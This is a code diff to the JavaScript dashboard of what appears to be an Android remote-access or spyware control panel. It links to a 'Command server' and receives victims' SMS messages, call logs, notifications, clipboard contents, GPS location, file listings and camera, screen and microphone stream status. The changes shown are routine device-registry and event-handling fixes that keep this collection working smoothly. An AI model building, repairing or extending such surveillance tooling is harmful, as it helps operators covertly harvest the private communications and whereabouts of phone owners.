@@ -231,10 +231,37 @@ function formatBytes(bytes) {
 // Device Lifecycle & Registry Management
 // ─────────────────────────────────────────────────────────────
 
-function getOrCreateDevice(deviceId) {
+function getOrCreateDevice(deviceId, meta) {
   if (!deviceId) return null;
+
+  const hardwareId = meta?.deviceId || meta?.info?.deviceId;
+
+  // Deduplicate by hardware deviceId if known
+  if (hardwareId) {
+    for (const [existingId, existingDev] of devices.entries()) {
+      if (existingDev.deviceId === hardwareId && existingId !== deviceId) {
+        logDebug(`[REGISTRY] Rebinding device ${hardwareId} from ${existingId} to ${deviceId}`);
+        devices.delete(existingId);
+        existingDev.id = deviceId;
+        existingDev.deviceId = hardwareId;
+        if (meta.model && meta.model !== 'Android Device') existingDev.info.model = meta.model;
+        if (meta.manufacturer) existingDev.info.manufacturer = meta.manufacturer;
+        devices.set(deviceId, existingDev);
+        if (selectedDeviceId === existingId) {
+          selectedDeviceId = deviceId;
+        }
+        renderDevicesList();
+        return existingDev;
+      }
+    }
+  }
+
   if (devices.has(deviceId)) {
-    return devices.get(deviceId);
+    const existingDev = devices.get(deviceId);
+    if (hardwareId) existingDev.deviceId = hardwareId;
+    if (meta?.model && meta.model !== 'Android Device') existingDev.info.model = meta.model;
+    if (meta?.manufacturer) existingDev.info.manufacturer = meta.manufacturer;
+    return existingDev;
   }
 
   logDebug(`[REGISTRY] Registering new device target: ${deviceId}`);
@@ -250,11 +277,15 @@ function getOrCreateDevice(deviceId) {
     document.body.appendChild(audioEl);
   }
 
+  const modelName = (meta && meta.model && meta.model !== 'Android Device') ? meta.model : 'Android Device';
+  const mfrName = (meta && meta.manufacturer) ? meta.manufacturer : 'Android';
+
   const dev = {
     id: deviceId,
+    deviceId: hardwareId || null,
     info: {
-      model: 'Android Device',
-      manufacturer: 'Android',
+      model: modelName,
+      manufacturer: mfrName,
       version: '—',
       battery: 100,
       batteryTemp: 0,
@@ -1477,6 +1508,11 @@ talkbackToggle?.addEventListener('click', async () => {
 
 socket.on('connect', () => {
   updateStatus('Connected to Command server');
+  // Clear any existing devices to prevent ghost devices from previous connections
+  devices.clear();
+  selectedDeviceId = null;
+  renderDevicesList();
+  resetSidebarToDefault();
 });
 
 socket.on('connect_error', () => {
@@ -1487,12 +1523,14 @@ socket.on('id', (id) => {
   myId = id;
   logDebug(`Authenticated session ID: ${myId}`);
   socket.emit('identify', 'web');
-  socket.emit('web-client-ready', myId);
 });
 
-socket.on('android-client-ready', (id) => {
+socket.on('android-client-ready', (data) => {
+  const id = (typeof data === 'object' && data !== null) ? data.id : data;
+  if (!id) return;
+  const meta = (typeof data === 'object' && data !== null) ? data : null;
   logDebug(`[NETWORK] Android client detected: ${id}`);
-  const dev = getOrCreateDevice(id);
+  const dev = getOrCreateDevice(id, meta);
   // Send initial ping to fetch device profile & location
   socket.emit('cmd:ping', { to: id });
   renderDevicesList();
@@ -1602,8 +1640,22 @@ socket.on('device_info', (info) => {
   const deviceId = info.from || selectedDeviceId || (devices.size > 0 ? Array.from(devices.keys())[0] : null);
   if (!deviceId) return;
 
-  const dev = getOrCreateDevice(deviceId);
+  const dev = getOrCreateDevice(deviceId, info);
   logDebug(`[TELEMETRY] Device profile updated for ${info.model || deviceId}`);
+
+  if (info.deviceId) {
+    dev.deviceId = info.deviceId;
+    // Consolidate any duplicate entries with this same hardware deviceId
+    for (const [existingId, existingDev] of devices.entries()) {
+      if (existingDev !== dev && existingDev.deviceId === info.deviceId) {
+        logDebug(`[TELEMETRY] Consolidating duplicate device for ${info.deviceId}: ${existingId} into ${deviceId}`);
+        devices.delete(existingId);
+        if (selectedDeviceId === existingId) {
+          selectedDeviceId = deviceId;
+        }
+      }
+    }
+  }
 
   if (info.model) dev.info.model = info.model;
   if (info.manufacturer) dev.info.manufacturer = info.infoManufacturer || info.manufacturer;
@@ -1631,9 +1683,9 @@ socket.on('device_info', (info) => {
 // Stream Status Synchronization
 socket.on('stream_status', (data) => {
   const deviceId = data.from || selectedDeviceId;
-  if (!deviceId) return;
+  if (!deviceId || !devices.has(deviceId)) return;
 
-  const dev = getOrCreateDevice(deviceId);
+  const dev = devices.get(deviceId);
   const status = data.status || data;
   logDebug(`[STREAM_STATUS] [${dev.info.model || deviceId}] Front:${status.frontCamera} Back:${status.backCamera} Screen:${status.screen} Mic:${status.mic} GPS:${status.location}`);
 
@@ -1655,9 +1707,9 @@ socket.on('stream_status', (data) => {
 socket.on('notification', (data) => {
   const deviceId = data.from || selectedDeviceId;
   const notif = data.notification;
-  if (!notif) return;
+  if (!notif || !deviceId || !devices.has(deviceId)) return;
 
-  const dev = getOrCreateDevice(deviceId);
+  const dev = devices.get(deviceId);
   dev.notifications.unshift(notif);
   if (dev.notifications.length > 50) dev.notifications.pop();
 
@@ -1671,9 +1723,9 @@ socket.on('notification', (data) => {
 // Call Logs
 socket.on('call_log', (data) => {
   const deviceId = data.from || selectedDeviceId;
-  if (!data.call_logs) return;
+  if (!data.call_logs || !deviceId || !devices.has(deviceId)) return;
 
-  const dev = getOrCreateDevice(deviceId);
+  const dev = devices.get(deviceId);
   dev.callLogs = data.call_logs;
   logDebug(`[CALLS] Loaded ${data.call_logs.length} call logs for ${dev.info.model || deviceId}`);
 
@@ -1685,9 +1737,9 @@ socket.on('call_log', (data) => {
 // SMS Messages
 socket.on('sms', (data) => {
   const deviceId = data.from || selectedDeviceId;
-  if (!data.sms_messages) return;
+  if (!data.sms_messages || !deviceId || !devices.has(deviceId)) return;
 
-  const dev = getOrCreateDevice(deviceId);
+  const dev = devices.get(deviceId);
   dev.smsMessages = data.sms_messages;
   logDebug(`[SMS] Loaded ${data.sms_messages.length} messages for ${dev.info.model || deviceId}`);
 
@@ -1699,9 +1751,9 @@ socket.on('sms', (data) => {
 // Applications List
 socket.on('apps_list', (data) => {
   const deviceId = data.from || selectedDeviceId;
-  if (!data.apps) return;
+  if (!data.apps || !deviceId || !devices.has(deviceId)) return;
 
-  const dev = getOrCreateDevice(deviceId);
+  const dev = devices.get(deviceId);
   dev.apps = data.apps;
   logDebug(`[APPS] Synchronized ${data.apps.length} applications for ${dev.info.model || deviceId}`);
 
@@ -1713,9 +1765,9 @@ socket.on('apps_list', (data) => {
 // Environmental Sensors
 socket.on('sensor_data', (data) => {
   const deviceId = data.from || selectedDeviceId;
-  if (!data.sensors) return;
+  if (!data.sensors || !deviceId || !devices.has(deviceId)) return;
 
-  const dev = getOrCreateDevice(deviceId);
+  const dev = devices.get(deviceId);
   dev.sensors = data.sensors;
   dev.sensorHistory.push({
     lux: data.sensors.lux || 0,
@@ -1738,9 +1790,9 @@ socket.on('sensor_data', (data) => {
 // Network Analyzer
 socket.on('network_info', (data) => {
   const deviceId = data.from || selectedDeviceId;
-  if (!data.network) return;
+  if (!data.network || !deviceId || !devices.has(deviceId)) return;
 
-  const dev = getOrCreateDevice(deviceId);
+  const dev = devices.get(deviceId);
   dev.network = data.network;
   logDebug(`[NETWORK] [${dev.info.model || deviceId}] SSID=${data.network.ssid}, Speed=${data.network.linkSpeed} Mbps`);
 
@@ -1789,20 +1841,20 @@ socket.on('screenshot_data', (data) => {
 // Clipboard
 socket.on('clipboard_data', (data) => {
   const deviceId = data.from || selectedDeviceId;
-  if (data.clipboard !== undefined) {
-    const dev = getOrCreateDevice(deviceId);
-    dev.clipboard = data.clipboard;
-    if (selectedDeviceId === deviceId && clipboardTextArea) {
-      clipboardTextArea.value = data.clipboard;
-    }
-    logDebug(`[CLIPBOARD] Synced text from ${dev.info.model || deviceId}`);
+  if (data.clipboard === undefined || !deviceId || !devices.has(deviceId)) return;
+
+  const dev = devices.get(deviceId);
+  dev.clipboard = data.clipboard;
+  if (selectedDeviceId === deviceId && clipboardTextArea) {
+    clipboardTextArea.value = data.clipboard;
   }
+  logDebug(`[CLIPBOARD] Synced text from ${dev.info.model || deviceId}`);
 });
 
 // GPS Location Telemetry
 socket.on('location', (data) => {
   const deviceId = data.from || selectedDeviceId;
-  if (deviceId && data.latitude !== undefined && data.longitude !== undefined) {
+  if (deviceId && devices.has(deviceId) && data.latitude !== undefined && data.longitude !== undefined) {
     updateDeviceLocation(deviceId, data.latitude, data.longitude);
   }
 });
@@ -1810,8 +1862,8 @@ socket.on('location', (data) => {
 // File System Events
 socket.on('fs:files', (data) => {
   const deviceId = data.from || selectedDeviceId;
-  if (data.file_list) {
-    const dev = getOrCreateDevice(deviceId);
+  if (data.file_list && deviceId && devices.has(deviceId)) {
+    const dev = devices.get(deviceId);
     dev.files = data.file_list.files;
     dev.currentPath = data.file_list.currentPath;
     if (selectedDeviceId === deviceId) {
